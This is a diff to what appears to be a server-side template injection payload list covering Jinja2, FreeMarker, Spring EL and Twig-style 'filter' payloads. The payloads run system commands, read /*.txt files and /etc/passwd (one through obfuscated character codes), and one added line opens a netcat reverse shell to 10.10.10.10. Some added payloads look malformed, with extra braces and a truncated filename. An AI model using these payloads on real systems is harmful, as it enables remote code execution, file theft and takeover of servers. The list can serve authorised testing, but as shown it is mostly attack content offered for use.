@@ -49,7 +49,6 @@ ${"freemarker.template.utility.Execute"?new()("whoami")}
 {{config.__class__.__init__.__globals__['os'].popen('cat+/*.txt').read()}}
 {{config.__class__.__init__.__globals__['os'].popen('cat%2B/*.txt').read()}}
 {{config.__class__.__init__.__globals__['os'].popen('cat%2B%2F*.txt').read()}}
-{{config.__class__.__init__.__globals__['os'].popen('cat%2B%2F*.txt').read()}}
 {{config.__class__.__init__.__globals__['os'].popen('cat%2B%2F%2A.txt').read()}}
 {{config.__class__.from_envvar.__globals__.__builtins__. __import__("os").popen("pwd").read()}}
 {{config.__class__.from_envvar.__globals__.__builtins__. __import__("os").popen("id").read()}}
@@ -98,3 +97,16 @@ ${"freemarker.template.utility.Execute"?new()("whoami")}
 ${T(java.lang.System).getenv()}
 ${T(java.lang.Runtime).getRuntime().exec('cat etc/passwd')}
 ${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(100))).getInputStream())}
+{{{{[\'pwd']|filter('system')}}}}
+{{{{[\'id']|filter('system')}}}}
+{{{{[\'whoami']|filter('system')}}}}
+{{{{[\'ls']|filter('system')}}}}
+{{{{[\'ls+/']|filter('system')}}}}
+{{{{[\'ls%2B/']|filter('system')}}}}
+{{{{[\'ls%2B%2F']|filter('system')}}}}
+{{{{[\'cat+/*.txt']|filter('system')}}}}
+{{{{[\'cat%2B/*.txt']|filter('system')}}}}
+{{{{[\'cat%2B%2F*.txt']|filter('system')}}}}
+{{{{[\'cat%2B%2F%2A.tx']|filter('system')}}}}
+{{{{[\'whoami']|filter('system')}}}}
+{{{{[\'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.10.10 7979 >/tmp/f']|filter('system')}}}}
